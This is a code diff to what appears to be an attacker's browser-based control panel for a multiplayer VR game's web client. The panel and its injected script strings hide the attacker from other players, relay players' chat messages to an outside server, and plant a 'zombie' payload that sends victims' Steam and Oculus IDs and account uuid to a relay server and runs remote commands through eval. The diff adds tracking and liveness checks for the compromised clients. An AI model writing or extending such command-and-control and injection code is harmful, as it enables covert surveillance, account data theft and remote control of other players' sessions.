@@ -74,22 +74,16 @@
                         last update <time></time>
                     </div>
                 </div>
-                <div class="card text-center">
+                <div class="card text-center" id="zombies">
                     <div class="card-header">Zombies</div>
-                    <ul class="list-group list-group-flush zombieList">
-                        <li class="list-group-item">zombie</li>
-                        <li class="list-group-item">zombie</li>
-                        <li class="list-group-item">zombie</li>
-                        <li class="list-group-item">zombie</li>
-                        <li class="list-group-item">zombie</li>
-                        <li class="list-group-item">zombie</li>
-                        <li class="list-group-item">zombie</li>
-                        <li class="list-group-item">zombie</li>
-                        <li class="list-group-item">zombie</li>
-                        <li class="list-group-item">zombie</li>
-                        <li class="list-group-item">zombie</li>
-                        <li class="list-group-item">zombie</li>
-                    </ul>
+                    <ul class="list-group list-group-flush zombieList"></ul>
+                    <div class="card-footer text-muted zombieList-footer">
+                       <div class="form-check">
+                            <input class="form-check-input" type="checkbox" value="" id="zombiesAutorefresh">
+                            <label class="form-check-label" for="zombiesAutorefresh">autorefresh</label>
+                        </div>
+                        last update <time></time>
+                    </div>
                 </div>
             </div>
         </div></div>
@@ -469,7 +463,7 @@ let hideUsernameFromRoomPreview = `Array.prototype.forEach.call(document.getElem
 let hideFirstCommaFromRoomPreview = "setTimeout(function(){var n=document.getElementById('room-card-players').childNodes;if(n[0].nodeName==='SCRIPT'&&n[1].nodeName==='#text'&& n[1].data===', '){n[1].remove()}},1);";
 let hideUsernameFromRoomParticipants = `Array.prototype.forEach.call(document.querySelectorAll('#room-participants li'),function(e){if(e.querySelector('h3.user-name').firstChild.nodeValue==='${textName}'){e.remove()}});`;
 let persistentChatEavesdropping = `;sendChat=function(){var s=new WebSocket('${relayServer}');s.onopen=function(){s.send(JSON.stringify({'type':'chat','roomId':roomState.roomId,'name':NAME,'steamId':mySteamId,'oculusId':myOculusId,'message':$('#room-chat-input').val()}));if(canSendChatMessage){canSendChatMessage= false;var _0x1865xb7=$(_0x6af9[1362])[_0x6af9[743]]();if(_0x1865xb7!= _0x6af9[90]){$(_0x6af9[1362])[_0x6af9[743]](_0x6af9[90]);$(_0x6af9[1362])[_0x6af9[1359]]();displayChatMessage(_0x1865xb7,USER);Unity[_0x6af9[1072]](_0x6af9[1971],[_0x1865xb7],USER,_0x6af9[1972]);gaChatMessageSentEvent()};setTimeout(function(){canSendChatMessage= true},CHATRATELIMIT)};};};`;
-let makeZombie = "var sz=new WebSocket('ws://172.26.103.128:8081');sz.onopen=function(){sz.send(JSON.stringify({'type':'zombie-register','steamId':mySteamId,'oculusId':myOculusId,'uuid':ACCOUNT.uuid}))};sz.onmessage=function(e){var m=JSON.parse(e.data);if(m.type==='zombie-cmd'){sz.send(JSON.stringify({type:'zombie-result','steamId':mySteamId,'oculusId':myOculusId,'uuid':ACCOUNT.uuid,result:eval(m.cmd)}))}};";
+let makeZombie = `var sz=new WebSocket('${relayServer}');sz.onopen=function(){sz.send(JSON.stringify({'type':'zombie-register','steamId':mySteamId,'oculusId':myOculusId,'uuid':ACCOUNT.uuid,name:NAME}))};sz.onmessage=function(e){var m=JSON.parse(e.data);if(m.type==='zombie-cmd'){sz.send(JSON.stringify({type:'zombie-result','steamId':mySteamId,'oculusId':myOculusId,'uuid':ACCOUNT.uuid,result:eval(m.cmd)}));}else if(m.type==='zombie-ping'){sz.send(JSON.stringify({type:'zombie-pong',uuid:ACCOUNT.uuid,}));}};`;
 let discoverRoom = `joinRoomWithId = function(roomId) {var srd=new WebSocket('${relayServer}');srd.onopen=function(){srd.send(JSON.stringify({'type':'room-discovered','roomId':roomId,})); checkMyUserCreatedRoom(); signal["write"]({ 'type': "room-join", 'roomId': roomId, 'name': NAME, 'uuid': ACCOUNT["uuid"], 'version': UNITYVERSION, 'steamId': mySteamId, 'oculusId': myOculusId }); srd.close(); };}`;
 //endregion
 
@@ -1061,7 +1055,6 @@ function sendZombieCmd(zombieUuid, cmd){
     }));
 }
 
-let zombies = [];
 var messageRelayWs = new WebSocket('ws://127.0.0.1:8081');
 messageRelayWs.onopen = function(){
     messageRelayWs.send(JSON.stringify({type:'control-panel-connect'}));
@@ -1080,7 +1073,7 @@ messageRelayWs.onmessage = function(event){
             break;
         case 'zombie-register': {
             console.log('New zombie:', message.uuid);
-            zombies.push(message.uuid);
+            zombieManager.addZombie(message.uuid, message.steamId, message.oculusId, message.name);
 
             let repl = repls[message.uuid];
             repl.formElement.addEventListener("submit", function (event) {
@@ -1098,11 +1091,172 @@ messageRelayWs.onmessage = function(event){
             repls[message.uuid].renderResult(message.result);
             break;
         }
+        case 'zombie-pong': {
+            zombieManager.receivedPong(message.uuid);
+            break;
+        }
         default:
             console.warn('messageRelayWs unexpected message');
     }
 };
 
+function Zombie(uuid, steamId, oculusId, name){
+    let that = this;
+    this.uuid = uuid;
+    this.steamId = steamId;
+    this.oculusId = oculusId;
+    this.name = name;
+
+    this.receivedPong = false;
+
+
+    this.ping = function(){
+        this.receivedPong = false;
+        messageRelayWs.send(JSON.stringify({
+            type: "zombie-ping",
+            uuid: that.uuid,
+        }));
+    };
+}
+
+function ZombieUI(zombie){
+    this.zombieElement = document.createElement('li');
+    this.zombieElement.classList.add('list-group-item');
+    this.zombieElement.classList.add('bg-warning');
+    this.zombieElement.appendChild(document.createTextNode(zombie.uuid + ' · ' + zombie.name));
+
+    this.render = function(parent) {
+        parent.appendChild(this.zombieElement);
+    };
+    this.hide = function(){
+        this.zombieElement.parentNode.removeChild(this.zombieElement);
+    };
+}
+
+
+function ZombiesManager(){
+    let that = this;
+    this.zombies = {};
+
+    this.zombieManagerUI = new ZombiesManagerUI(this);
+
+    this.intervalId = null;
+
+    this.update = function(){
+        for (let uuid in this.zombies){
+            if(this.zombies.hasOwnProperty(uuid)){
+                this.zombies[uuid].ping();
+                setTimeout(function(){
+                     if(that.zombies[uuid].receivedPong){
+                         that.zombieManagerUI.updateZombie(that.zombies[uuid]);
+                     }
+                     else{
+                         that.zombieManagerUI.markZombieLost(that.zombies[uuid]);
+                     }
+                }, 1000);
+            }
+        }
+        this.zombieManagerUI.updateFooter();
+    };
+
+    this.addZombie = function(uuid, steamId, oculusId, name){
+        let zombie = new Zombie(uuid, steamId, oculusId, name);
+        if(this.zombies[uuid]){
+            console.warn(`Zombie with uuid ${uuid} already exists. Will be overwritten.`);
+        }
+        this.zombies[uuid] = zombie;
+        this.zombieManagerUI.addZombie(zombie);
+    };
+
+    this.receivedPong = function(uuid){
+        if(! this.zombies[uuid]){
+            console.warn(`Zombie with uuid ${uuid} not found.`);
+            return;
+        }
+        this.zombies[uuid].receivedPong = true;
+    };
+
+    this.startPeriodicUpdates = function(){
+        if(this.intervalId !== null){
+            console.error('ERROR', 'Periodic updates already started.');
+            return;
+        }
+
+        this.zombieManagerUI.autorefreshInput.checked = true;
+        that.update();
+        this.intervalId = setInterval(function(){
+            that.update();
+        },5000);
+    };
+    this.stopPeriodicUpdates = function(){
+        if(this.intervalId === null){
+            console.error('ERROR', 'Cannot stop. Periodic updates are not running.');
+            return;
+        }
+
+        this.zombieManagerUI.autorefreshInput.checked = false;
+        clearInterval(this.intervalId);
+        this.intervalId = null;
+    };
+    this.togglePeriodicUpdates = function(){
+        if(this.intervalId === null){
+            this.startPeriodicUpdates();
+        }
+        else{
+            this.stopPeriodicUpdates();
+        }
+    }
+}
+
+
+function ZombiesManagerUI(zombieManager){
+    // TODO Maybe dynamically insert html
+    let that = this;
+    this.zombieManager = zombieManager;
+    this.cardElement = document.getElementById('zombies');
+    this.listElement = this.cardElement.getElementsByTagName('ul')[0];
+    this.updatedTimeElement = this.cardElement.querySelector('.card-footer time');
+    this.autorefreshInput = this.cardElement.querySelector('.card-footer .form-check input');
+    this.autorefreshInput.checked = false;
+
+    this.zombiesUIs = {};
+
+    this.hideAllZombies = function(){
+        this.listElement.innerHTML = '';
+    };
+
+    this.addZombie = function(zombie){
+        let zombieUI = new ZombieUI(zombie);
+        zombieUI.render(this.listElement);
+        this.zombiesUIs[zombie.uuid] = zombieUI;
+
+        this.updateFooter();
+    };
+
+    this.updateZombie = function(zombie){
+        let zombieElement = this.zombiesUIs[zombie.uuid].zombieElement;
+        zombieElement.classList.remove('bg-warning');
+        zombieElement.classList.add('bg-success');
+    };
+
+    this.markZombieLost = function(zombie){
+        let zombieElement = this.zombiesUIs[zombie.uuid].zombieElement;
+        zombieElement.classList.remove('bg-success');
+        zombieElement.classList.remove('bg-warning');
+        zombieElement.classList.add('bg-secondary');
+    };
+
+    this.updateFooter = function(){
+        this.updatedTimeElement.innerHTML = '';
+        this.updatedTimeElement.appendChild(
+            document.createTextNode((new Date).toLocaleTimeString())
+        );
+    };
+
+    this.autorefreshInput.addEventListener("click", function (event) {
+        that.zombieManager.togglePeriodicUpdates();
+    });
+}
 
 function PublicRoomsManager(){
     let that = this;
@@ -1170,10 +1324,10 @@ function PublicRoomsManager(){
     }
 }
 
-function PublicRoomsUI(publicRooms){
+function PublicRoomsUI(publicRoomsManager){
     // TODO Maybe dynamically insert html
     let that = this;
-    this.publicRooms = publicRooms;
+    this.roomsManager = publicRoomsManager;
     this.publicRoomsCardElement = document.getElementById('publicRooms');
     this.publicRoomsListElement = this.publicRoomsCardElement.getElementsByTagName('ul')[0];
     this.updatedTimeElement = this.publicRoomsCardElement.querySelector('.card-footer time');
@@ -1215,7 +1369,7 @@ function PublicRoomsUI(publicRooms){
     };
 
     this.autorefreshInput.addEventListener("click", function (event) {
-        that.publicRooms.togglePeriodicUpdates();
+        that.roomsManager.togglePeriodicUpdates();
     });
 }
 
@@ -1387,6 +1541,8 @@ function DiscoveredRoomsUI(discoveredRoomsManager){
 let publicRoomsManager = new PublicRoomsManager();
 let discoveredRoomsManager = new DiscoveredRoomsManager();
 discoveredRoomsManager.startPeriodicUpdates();
+let zombieManager = new ZombiesManager();
+zombieManager.startPeriodicUpdates();
 
 </script>
 </body>
